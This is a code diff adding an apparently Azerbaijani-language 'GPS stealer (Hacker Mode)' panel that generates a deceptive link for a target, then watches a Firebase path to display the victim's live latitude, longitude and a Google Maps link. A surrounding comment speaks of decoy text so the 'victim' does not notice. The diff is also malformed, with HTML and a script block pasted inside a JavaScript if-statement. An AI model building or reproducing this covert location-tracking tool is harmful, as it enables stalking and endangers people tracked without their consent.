@@ -171,6 +171,64 @@ const urlParams = new URLSearchParams(window.location.search);
 const targetId = urlParams.get('target');
 
 if(targetId) {
+
+<div style="font-family:'Outfit'; color:white; padding:15px;">
+    <h2 style="color:var(--cyber); text-align:center; font-family:'Syncopate'; font-size:0.8rem;">GPS OĞURLAYICI (Hacker Mode)</h2>
+    
+    <div style="background:var(--glass); border:1px solid var(--border); padding:15px; border-radius:15px; margin-bottom:20px;">
+        <p style="font-size:0.7rem; opacity:0.6; margin-bottom:10px;">Aldadıcı Link:</p>
+        <input type="text" id="track-url" readonly style="width:100%; font-size:0.65rem; color:var(--cyber); background:#000; border:1px solid #333; padding:8px;">
+        <button class="btn-main" onclick="copyLink()" style="padding:10px; font-size:0.7rem; background:gray;">LİNKİ KOPYALA</button>
+    </div>
+
+    <div id="status-box" style="background:#000; padding:15px; border-radius:15px; border:1px solid #222;">
+        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+            <span style="font-size:0.7rem;">HƏDƏF: <span id="track-status" style="color:red;">DEAKTİV</span></span>
+            <span id="update-time" style="font-size:0.6rem; color:gray;">--:--:--</span>
+        </div>
+        
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
+            <div style="text-align:center; border:1px solid #111; padding:5px;">
+                <small style="font-size:0.5rem; opacity:0.5;">LAT</small>
+                <div id="lat-val" style="color:var(--tools); font-weight:bold;">0.0000</div>
+            </div>
+            <div style="text-align:center; border:1px solid #111; padding:5px;">
+                <small style="font-size:0.5rem; opacity:0.5;">LNG</small>
+                <div id="lng-val" style="color:var(--tools); font-weight:bold;">0.0000</div>
+            </div>
+        </div>
+
+        <button id="map-btn" class="btn-main" style="display:none; background:white; color:black; font-size:0.8rem; height:40px; margin-top:15px;">GOOGLE MAPS-DƏ İZLƏ</button>
+    </div>
+</div>
+
+<script>
+    const uid = localStorage.getItem('elite_session');
+    const link = window.location.origin + window.location.pathname.replace('gps.html', 'index.html') + "?target=" + uid;
+    document.getElementById('track-url').value = link;
+
+    function copyLink() {
+        document.getElementById('track-url').select();
+        document.execCommand('copy');
+        alert("Link kopyalandı!");
+        
+        // Dinləməni başlat
+        db.ref('live_tracks/' + uid).on('value', snap => {
+            const d = snap.val();
+            if(d) {
+                document.getElementById('track-status').innerText = "AKTİV";
+                document.getElementById('track-status').style.color = "#00ff00";
+                document.getElementById('lat-val').innerText = d.lat.toFixed(5);
+                document.getElementById('lng-val').innerText = d.lng.toFixed(5);
+                document.getElementById('update-time').innerText = new Date().toLocaleTimeString();
+                
+                const mBtn = document.getElementById('map-btn');
+                mBtn.style.display = 'block';
+                mBtn.onclick = () => window.open(`https://www.google.com/maps?q=${d.lat},${d.lng}`, '_blank');
+            }
+        });
+    }
+</script>
     // Qurban qara ekran görməsin deyə aldadıcı yazı
     document.body.innerHTML = `
         <div style="background:black; color:white; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center; padding:20px;">
